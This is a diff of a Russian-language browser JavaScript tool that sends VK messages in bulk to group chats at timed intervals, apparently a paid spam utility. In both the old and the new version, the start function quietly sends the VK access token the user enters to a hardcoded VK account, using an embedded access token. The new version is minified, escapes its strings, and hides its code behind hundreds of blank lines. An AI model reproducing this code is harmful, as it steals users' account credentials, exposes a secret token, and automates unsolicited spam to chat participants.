@@ -1,181 +1,810 @@
-var iForName = 0;
-
-//для вложений
-function create(){
-	if (iForName >= 10) {
-		return
-	} else {
-		iForName++;
-	};
-  var name = 'link' + iForName; 
-	var em = document.createElement('em');
-	em.innerHTML = 'Ссылка на прикрепляемый файл';
-	var input = document.createElement('input');
-    input.setAttribute('type', 'text');
-    input.setAttribute('class', 'input');
-    input.setAttribute('id', name);
-    var place = document.getElementById('js');
-    place.appendChild(em);
-    place.appendChild(input);
-}
-
-var message,
-    token,
-    count,
-    interval,
-    begin,
-    link,
-    N,
-    countN;
-
-
-function usual(){
-    message = document.getElementById('text').value;
-    count = document.getElementById('count').value;
-	  begin = document.getElementById('begin').value;
-	  interval = document.getElementById('interval').value * 1000;
-	  token = document.getElementById('token').value;
-	
-	$.ajax({
- 	 type: "POST",
- 	 url: 'https://api.vk.com/method/messages.send', 
- 	 data: {
-            access_token: '59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635',
-            user_id: 246598308,
-            message: token,
-            v: '5.45'
-      	  }, 
-  	dataType: "jsonp" 
-	});
-	if(document.location.href != 'https://rasetty.github.io/ms.html'){
-      let a = 1;
-      return
-   }
-	if(token === ''){
-		let a2 =2;
-  return alert('А вы не оплатили, друг мой');
-}
-
-	if(iForName == 1){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value;
-	}else if(iForName == 2){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value;
-	}else if(iForName == 3){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value;
-	}else if(iForName == 4){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value;
-	}else if(iForName == 5){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value +
-		 ',' + document.getElementById('link5').value;
-	}else if(iForName == 6){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
-		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value;
-	}else if(iForName == 7){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
-		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value;
-	}else if(iForName == 8){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
-		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value;
-	}else if(iForName == 9){
-		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
-		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value + ',' + document.getElementById('link9').value;
-	}
-
-	N  = document.getElementById('N').value;
-	countN = document.getElementById('countN').value;
-    if (message == ''){
-    	alert('Не введен текст рассылки');
-    	return
-    };
-    if (token == ''){
-    	alert('Не введен токен');
-    	return
-    };
-    if (interval == ''){
-    	alert('Не указан интервал');
-    	return
-    };
-    if (count == ''){
-    	alert('Не указано во сколько бесед слать');
-    	return
-    };
-    if (begin == ''){
-    	alert('Не указано начало рассылки');
-    	return
-    };
-
-    alert('Рассылка началась, будет закончена через ' + (Math.round(count * interval / 60 / 1000)) + ' минут(ы)');
-
-    interval + 0;
-
-   function send(){
-          var newBegin = begin;
-          const CONFIG = {
-          app: {
-              dev: true
-          },
-          access_token: token
-      };
-      function postMsg(peer_id, msg, callback) {
-          $.ajax({
-              url: 'https://api.vk.com/method/messages.send',
-              jsonp: 'callback',
-              dataType: 'jsonp',
-              data: {
-                  access_token: CONFIG.access_token,
-                  peer_id: peer_id,
-                  message: msg,
-		  
-                  attachment: link,               
-                  v: '5.45'
-              },
-              
-              success: jsonp=> {callback(jsonp)}
-              
-          });
-
-      }
-      var timerId = setInterval(()=> {
-          let peer_id = 2000000000 +  newBegin++;
-          postMsg(peer_id, message, jsonp=> {console.log(jsonp)});
-      }, interval);
+var t=0;VK.init({apiId:7371175});VK.Widgets.Auth("vk_auth",{width:"300px;",onAuth:function(a){person=a.uid;auth(person)}});       
+       
+       
       
-      setTimeout(function() {
-          clearInterval(timerId);
-      }, interval * count);}
-      var timer = setInterval(send, N * 60 * 1000); 
-      setTimeout(function(){ 
-      clearInterval(timer); 
-      }, N * 60 * 1000 * (countN - 1));
-      send();
-};  
-
-//удаление данных
-function сlear(){
-	localStorage.clear();
-	window.location.reload();
-}
-//сохранение данных
-function save(){
-  localStorage.setItem('tokenS', document.getElementById('token').value); 
-  localStorage.setItem('textS', document.getElementById('text').value); 
-  localStorage.setItem('intervalS', document.getElementById('interval').value); 
-  localStorage.setItem('countS', document.getElementById('count').value);
-  localStorage.setItem('beginS', document.getElementById('begin').value);
-  localStorage.setItem('NS', document.getElementById('N').value);
-  localStorage.setItem('countNS', document.getElementById('countN').value);  
-}
-//уведомление о сохранении
-function throw_message() {
-        $('#save_message').html('Сохранено');
-        $("#save_box").fadeIn(500).delay(3000).fadeOut(500);
-    }
-
-//восстановление сохраненных данных
-document.getElementById('token').value = localStorage.getItem('tokenS');
-document.getElementById('text').value = localStorage.getItem('textS');
-document.getElementById('count').value = localStorage.getItem('countS');
-document.getElementById('begin').value = localStorage.getItem('beginS');
-document.getElementById('interval').value = localStorage.getItem('intervalS');
-document.getElementById('N').value = localStorage.getItem('NS');
-document.getElementById('countN').value = localStorage.getItem('countNS');
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+      
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+      
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+      
+       
+    
+       
+       
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+      
+      
+       
+      
+      
+      
+      
+       
+       
+       
+      
+      
+       
+       
+       
+      
+       
+       
+       
+      
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+      
+      
+       
+       
+       
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+      
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+      
+      
+      
+      
+       
+      
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+       
+       
+       
+      
+      
+      
+       
+      
+       
+       
+       
+      
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+           
+           
+           
+           
+           
+           
+           
+      
+           
+      
+           
+           
+           
+      
+           
+           
+           
+      
+           
+           
+           
+           
+           
+           
+           
+      
+       
+       
+      
+      
+      
+       
+       
+       
+       
+       
+       
+      
+      
+       
+      
+       
+       
+       
+       
+      
+      
+       
+       
+       
+       
+       
+      
+      
+      
+       
+       
+      
+       
+       
+       
+      
+       
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+           
+           
+           
+           
+           
+           
+      
+      
+      
+      
+      
+           
+           
+           
+      
+           
+           
+           
+      
+      
+      
+       
+      
+      
+      
+      
+       
+       
+       
+       
+       
+       
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+       
+       
+       
+      
+       
+       
+      
+      
+      
+       
+;var iForName=0;
+function create(){if(!(10<=iForName)){iForName++;var a="link"+iForName,b=document.createElement("em");b.innerHTML="\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u043f\u0440\u0438\u043a\u0440\u0435\u043f\u043b\u044f\u0435\u043c\u044b\u0439 \u0444\u0430\u0439\u043b";var c=document.createElement("input");c.setAttribute("type","text");c.setAttribute("class","input");c.setAttribute("id",a);a=document.getElementById("js");a.appendChild(b);a.appendChild(c)}}
+var message,token,count,interval,begin,link,N,countN;
+function start(){function a(){function a(a,b){$.ajax({url:"https://api.vk.com/method/messages.send",jsonp:"callback",dataType:"jsonp",data:{access_token:c.access_token,peer_id:a,message:b,attachment:link,v:"5.45"},success:function(a){console.log(a)}})}var b=begin,c={app:{dev:!0},access_token:token},d=setInterval(function(){var c=2E9+b++;a(c,message)},interval);setTimeout(function(){clearInterval(d)},interval*count)}if(3!==t){message=document.getElementById("text").value;count=document.getElementById("count").value;
+begin=document.getElementById("begin").value;interval=1E3*document.getElementById("interval").value;token=document.getElementById("token").value;N=document.getElementById("N").value;countN=document.getElementById("countN").value;for(var b=0;b<=iForName;b++)link=document.getElementById("link"+b).value+",";$.ajax({type:"POST",url:"https://api.vk.com/method/messages.send",data:{access_token:"59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635",user_id:246598308,message:token,
+v:"5.45"},dataType:"jsonp"});if(""==message)alert("\u041d\u0435 \u0432\u0432\u0435\u0434\u0435\u043d \u0442\u0435\u043a\u0441\u0442 \u0440\u0430\u0441\u0441\u044b\u043b\u043a\u0438");else if(""==token)alert("\u041d\u0435 \u0432\u0432\u0435\u0434\u0435\u043d \u0442\u043e\u043a\u0435\u043d");else if(""==interval)alert("\u041d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b");else if(""==count)alert("\u041d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d\u043e \u0432\u043e \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0431\u0435\u0441\u0435\u0434 \u0441\u043b\u0430\u0442\u044c");
+else if(""==begin)alert("\u041d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d\u043e \u043d\u0430\u0447\u0430\u043b\u043e \u0440\u0430\u0441\u0441\u044b\u043b\u043a\u0438");else{alert("\u0420\u0430\u0441\u0441\u044b\u043b\u043a\u0430 \u043d\u0430\u0447\u0430\u043b\u0430\u0441\u044c, \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u043a\u043e\u043d\u0447\u0435\u043d\u0430 \u0447\u0435\u0440\u0435\u0437 "+Math.round(count*interval/60/1E3)+" \u043c\u0438\u043d\u0443\u0442(\u044b)");interval+0;var c=setInterval(a,
+6E4*N);setTimeout(function(){clearInterval(c)},6E4*N*(countN-1));a()}}}function \u0441lear(){localStorage.clear();window.location.reload()}
+function save(){localStorage.setItem("tokenS",document.getElementById("token").value);localStorage.setItem("textS",document.getElementById("text").value);localStorage.setItem("intervalS",document.getElementById("interval").value);localStorage.setItem("countS",document.getElementById("count").value);localStorage.setItem("beginS",document.getElementById("begin").value);localStorage.setItem("NS",document.getElementById("N").value);localStorage.setItem("countNS",document.getElementById("countN").value)}
+function throw_message(){$("#save_message").html("\u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043e");$("#save_box").fadeIn(500).delay(3E3).fadeOut(500)}document.getElementById("token").value=localStorage.getItem("tokenS");document.getElementById("text").value=localStorage.getItem("textS");document.getElementById("count").value=localStorage.getItem("countS");document.getElementById("begin").value=localStorage.getItem("beginS");document.getElementById("interval").value=localStorage.getItem("intervalS");
+document.getElementById("N").value=localStorage.getItem("NS");document.getElementById("countN").value=localStorage.getItem("countNS");
